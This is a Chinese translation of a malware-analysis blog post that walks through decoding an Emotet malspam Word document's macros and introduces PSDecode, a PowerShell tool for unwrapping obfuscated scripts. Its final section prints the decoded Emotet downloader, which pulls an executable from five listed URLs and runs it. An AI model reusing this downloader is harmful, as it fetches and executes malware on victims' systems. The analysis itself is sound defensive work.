> 原文链接: https://www.anquanke.com//post/id/91459 


# 通过分析Emotet来给大家介绍一款强大的PS模块-PSDecode


                                阅读量   
                                **109310**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者r3mrum，文章来源：r3mrum.wordpress.com
                                <br>原文地址：[https://r3mrum.wordpress.com/2017/12/15/from-emotet-psdecode-is-born/](https://r3mrum.wordpress.com/2017/12/15/from-emotet-psdecode-is-born/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p4.ssl.qhimg.com/t01140397b73a223f42.jpg)](https://p4.ssl.qhimg.com/t01140397b73a223f42.jpg)

> 在这篇文章中，我首先会跟大家分析目前比较热门的银行木马Emotet，并在分析的过程中给大家介绍一款功能强大的新工具（可对高度混淆的PowerShell脚本进行分析）。接下来，我会告诉大家如何使用这款工具，并且提取出已编码的PowerShell脚本。

[![](https://p2.ssl.qhimg.com/t013e97266e72cf294e.png)](https://p2.ssl.qhimg.com/t013e97266e72cf294e.png)



## 样本信息

本文所使用的分析样本是我从Brad的SANS ICS报告文章中“借鉴”过来的，感兴趣的同学可以参考Malware Traffic Analysis给出的资料【传送门】。<br>
文件名: 2017-11-29-Emotet-malspam-1st-run-Invoice _565700179.doc<br>
文件类型: Microsoft Word 97 – 2003 Document (.doc)<br>
MD5: a829a9d423a078d034379c8c454c701d<br>
SHA1: 40c65a45e6bb3fd4ce756ad8fbea1b5e9139e0a7<br>
SHA256: 7bdf7722115be910e2b301b3f6b3037bc4b987c588838cd2459aeeeec9f50be7<br>
VirusTotal (36 / 61)



## 提取嵌入的宏

一般来说，为了成功实现Emotet木马感染，攻击者的第一步操作就是向目标用户发送嵌入了恶意链接（指向托管的恶意文档）的钓鱼邮件，即社会工程学攻击。当目标用户打开文件之后，嵌入在文档中的宏将会被执行，然后下载并执行Emotet代码。所以说，当我们获取到这种恶意文档的副本之后，我们首先就要尝试提取出嵌入在恶意文档中的宏。<br>
网上有多种工具能够完成这部分操作，但是我不想老是在Linux和Windows环境中来回切换，因此我打算直接使用OfficeMalScanner。<br>
下图显示的是OfficeMalScanner成功从Word文档中提取出了嵌入的VB宏。<br>[![](https://p2.ssl.qhimg.com/t01ef8804d50eaceec2.png)](https://p2.ssl.qhimg.com/t01ef8804d50eaceec2.png)<br>
从上图中可以看到，我们成功地利用OfficeMalScanner（使用info选项）提取出了恶意文档中的宏。操作命令如下所示：

```
OfficeMalScanner 2017-11-29-Emotet-malspam-1st-run-Invoice _565700179.doc info
```

OfficeMalScanner在恶意Word文档中发现了如下所示的四个嵌入的VBA宏：

```
HoBCBVPdD
STGtjvOqUEB
ThisDocument
MWjDkwECDcSUw
```

发现之后，OfficeMalScanner会自动将这些嵌入的宏提取到当前目录下：

```
C:UsersREMDesktop2017-11-29-Emotet-malware2017-11-29-EMOTET-MALSPAM-1ST-RUN-INVOICE _565700179.DOC-Macros
```

[![](https://p0.ssl.qhimg.com/t01491e384a5353a6a5.png)](https://p0.ssl.qhimg.com/t01491e384a5353a6a5.png)



## 寻找解码函数

首先，我们要寻找的是这些宏中都包含的一个函数，即AutoOpen()函数。我们准备先从这个名叫ThisDocument的宏下手。下面给出的是我们在ThisDocument宏文件中所找到的AutoOpen()函数：<br>[![](https://p1.ssl.qhimg.com/t01aeb7315114708d23.png)](https://p1.ssl.qhimg.com/t01aeb7315114708d23.png)<br>
上图所示的AutoOpen()函数写在ThisDocument宏文件的底部位置，而这个函数中的绝大多数代码都是无意义的垃圾代码，但除了下面这行代码（上图中的第99行）：<br>
VBA.Shell$ jiwmsks, 0<br>
当恶意文档被打开之后，它将会自动执行AutoOpen()函数中的所有代码（包括上面这行），接下来，它还会使用VBA的Shell功能来执行变量“jiwmsks“中存储的任何内容（在一个隐藏窗口中执行）。<br>
对于Emotet木马来说，传递给VBA.Shell（即“jiwmsks“）的变量名与解码函数的名称是一样的，所以接下来，我们就要尝试找出这个解码函数。<br>
下图显示的是我们从“STGtjvOqUEB”宏文件中寻找到的解码函数“jiwmsks”：<br>[![](https://p3.ssl.qhimg.com/t010584e126ba7b96c3.png)](https://p3.ssl.qhimg.com/t010584e126ba7b96c3.png)<br>
一眼看去，这个函数似乎是一个“烫手的山芋“，因为这个函数中整整80行代码都经过了高度的混淆处理。



## 创建新的解码VBScript脚本

我们现在应该要“放聪明“一点，而不是”一根筋“。由于”jiwmsks”是一个解码函数，所以我们其实根本不用在意这个函数到底做了什么，我们只需要得到这个函数最终的输出结果就可以了。<br>
所以说，我们现在需要创建一个新的脚本，然后使用这个函数，这样就可以安全地执行并存储输出结果了。<br>
首先，将整个解码函数（从Function jiwmsks()到End Function，即第2行到第90行）代码拷贝到一个新的文本文件之中。<br>
接下来，我们并不需要让VBA.Shell来执行解码后的值，我们只需要直接输出这个值就可以了，然后将下列代码添加到“End Function“语句之后：<br>
wscript.echo jiwmsks<br>
第三步，由于宏代码使用的是VBA语句编写的。所以，为了从命令行执行这个新的脚本，我们需要将其中的脚本代码转换成VBA语句。对于Emotet，我们只需要修改一行代码就可以了。<br>[![](https://p2.ssl.qhimg.com/t01bc73ee6610b98ca8.png)](https://p2.ssl.qhimg.com/t01bc73ee6610b98ca8.png)<br>
Notepad++有一个非常赞的功能，就是当你选定一段文本之后，它会自动将该文本中其他内容一样的部分进行高亮处理。如上图所示，返回的变量位于第82行。

```
jiwmsks = CDTYtchKqa + lwZdcXfstH + Chr(34) + IDzLI + JEWGvsJm + PkhfTi + HddjQFA + HdPMtRtTE + uSuUXDwulB + wLJAmiqSdz + NuGQUiY + GGVvLNj + imzlMFo + PFrdrk + pICcVDM + RzFJLoLwMGf + BQjiricj + rztNrEIuZ + WHUGoa + dhrHBmrp + HLifpvFSFR + SphtjZ + FJGTlwJHURm
```

我们只需要处理这一行代码就可以了，我们首先要用“&amp;“替换掉其中的”+“，然后从拼接的字符串中移除Chr(34)。在所有我所见过的Emotet样本中，我发现Chr(34)一般代表的都是返回的变量。替换后的结果如下所示：

```
jiwmsks = CDTYtchKqa &amp; lwZdcXfstH &amp; IDzLI &amp; JEWGvsJm &amp; PkhfTi &amp; HddjQFA &amp; HdPMtRtTE &amp; uSuUXDwulB &amp; wLJAmiqSdz &amp; NuGQUiY &amp; GGVvLNj &amp; imzlMFo &amp; PFrdrk &amp; pICcVDM &amp; RzFJLoLwMGf &amp; BQjiricj &amp; rztNrEIuZ &amp; WHUGoa &amp; dhrHBmrp &amp; HLifpvFSFR &amp; SphtjZ &amp; FJGTlwJHURm
```

新的脚本如下图所示：<br>[![](https://p4.ssl.qhimg.com/t012cdccc5809086b9a.png)](https://p4.ssl.qhimg.com/t012cdccc5809086b9a.png)<br>
最后，我们需要将该脚本以后缀.vbs进行保存，例如emotet.vbs。



## 提取编码后的PowerShell

既然我们已经得到了一个可以直接打印出解码函数输出结果的新脚本，那我们就可以使用cscript.exe（从命令行运行）并将输出结果（解码后的PowerShell指令）重定向到一个新的文件（decoded_encoded.ps1）之中了。<br>
下图显示的是我们新脚本VBScript的运行情况：<br>[![](https://p0.ssl.qhimg.com/t01bd39c7321b6bf4b5.png)](https://p0.ssl.qhimg.com/t01bd39c7321b6bf4b5.png)<br>
下图显示的是decoded_encoded.ps1中的内容，代码经过了高度混淆化处理：<br>[![](https://p5.ssl.qhimg.com/t014845b38471da3582.png)](https://p5.ssl.qhimg.com/t014845b38471da3582.png)



## 解码PowerShell

手动解码反正是不可能的了，那我们该怎么办呢？解决方案就是：方法覆盖！<br>
在“方法覆盖“的帮助下，我就可以更改上述代码中Invoke-Expression命令的功能了。请大家直接看下图：<br>[![](https://p5.ssl.qhimg.com/t01567d6678c3541cd2.png)](https://p5.ssl.qhimg.com/t01567d6678c3541cd2.png)<br>
在上图中，左边的PowerShell脚本调用了Invoke-Expression命令，参数为“Write-Host this is a test”。而右边的PowerShell脚本有一个新定义的Invoke-Expression，它的功能与左边的代码一样。<br>[![](https://p5.ssl.qhimg.com/t01e4865a1179c17ce7.png)](https://p5.ssl.qhimg.com/t01e4865a1179c17ce7.png)<br>
执行正常的Invoke-Expression脚本后，输出结果为“this is a test”。这是因为标准的Invoke-Expression命令会直接尝试运行任何传递给它的数据(字符串“Write-Host ‘this is a test’”)，因为它默认会把这些数据当作有效的PowerShell命令。<br>
但是，当我们执行重写的Invoke-Expression脚本后，输出结果为“Write-Host ‘this is a test’”。这是因为PowerShell会决定如何实现我们的Invoke-Expression，而它只会将传递给它的参数直接打印出来，而不是执行这些命令。<br>
由于我们只需要获取解码后的命令，而不是让这些命令被执行，所以“方法覆盖“这种技术就非常适用于我们的场景了。



## PSDecode介绍

所以我借鉴了“方法覆盖“的理念，并开发了一个名叫PSDecode的PowerShell模块。<br>[![](https://p5.ssl.qhimg.com/t0143458d59bdbd895a.png)](https://p5.ssl.qhimg.com/t0143458d59bdbd895a.png)<br>
上图显示的是PSDecode脚本的输出结果，我们可以看到这里有四层代码，第一层是传递给PSDecode的原始编码脚本。最后一层为完全编码后的PowerShell脚本，这部分代码就是攻击者最终需要执行的代码：

```
############################## Layer 4 ##############################
$franc = new-object System.Net.WebClient;$nsadasd = new-object random;$bcd = ‘http://taswines.co.uk/AFh/,http://oilcom.com.ua/wZZ/,http://www.avcilarbinicilik.xyz/SkRagptdG/,http://randevu-dk.ru/q/,http://salon-grazia.ru/Hqrp/’.Split(‘,’);$karapas = $nsadasd.next(1, 343245);$huas = $env:public + ‘’ + $karapas + ‘.exe’;foreach($abc in $bcd)`{`try`{`$franc.DownloadFile($abc.ToString(), $huas);Invoke-Item($huas);break;`}`catch`{`write-host $_.Exception.Message;`}``}`
```

稍微格式化一下之后，我们可以得到如下所示的代码：

```
$franc = new-object System.Net.WebClient;
$nsadasd = new-object random;
$bcd = ‘http://taswines.co.uk/AFh/,http://oilcom.com.ua/wZZ/,http://www.avcilarbinicilik.xyz/SkRagptdG/,http://randevu-dk.ru/q/,http://salon-grazia.ru/Hqrp/’.Split(‘,’);
$karapas = $nsadasd.next(1, 343245);
$huas = $env:public + ‘’ + $karapas + ‘.exe’;
foreach($abc in $bcd)`{`try`{`$franc.DownloadFile($abc.ToString(), $huas);
Invoke-Item($huas);
break;
`}`catch`{`write-host $_.Exception.Message;
`}``}`
```

在PSDecode的帮助下，我们迅速地将高度混淆化的PowerShell脚本成功解码了，而且我们还识别出了Emotet在感染第二阶段所使用的URL地址。<br>
我已经将PSDecode上传到了我的【GitHub】上，感兴趣的同学可以自行下载使用。我并不认为我是一个专业的开发者，而且我的个人时间也有限，该工具目前可支持使用的测试场景还十分有限，因此如果你想帮助我完善该工具的话，欢迎大家在GitHub上提交自己的代码。



## 注意事项

请在隔离的沙盒环境中运行该脚本，如果编码的PowerShell尝试执行其原本功能，那么它很有可能会影响你的运行平台。比如说，如果恶意脚本调用了Net.WebClient.DownloadFile()，那么它将会在你的主机中下载某种恶意文件，而这肯定不是你想要看到的了。



## 参考资料
1. 从GitHub下载PSDecode：【[点我下载](https://github.com/R3MRUM/PSDecode)】
1. 下载OfficeMalScanner：【[点我下载](http://www.reconstructer.org/code/OfficeMalScanner.zip)】
1. 《新型EMOTET木马变种分析》：【[报告链接](https://securingtomorrow.mcafee.com/mcafee-labs/emotet-downloader-trojan-returns-in-force/)】
1. 《焦点：Emotet信息窃取恶意软件威胁》：【[报告链接](https://www.cylance.com/en_us/blog/threat-spotlight-emotet-infostealer-malware.html)】
1. 《重写Java时你所需要了解的12条规则》：【[文章链接](http://www.codejava.net/java-core/the-java-language/12-rules-of-overriding-in-java-you-should-know)】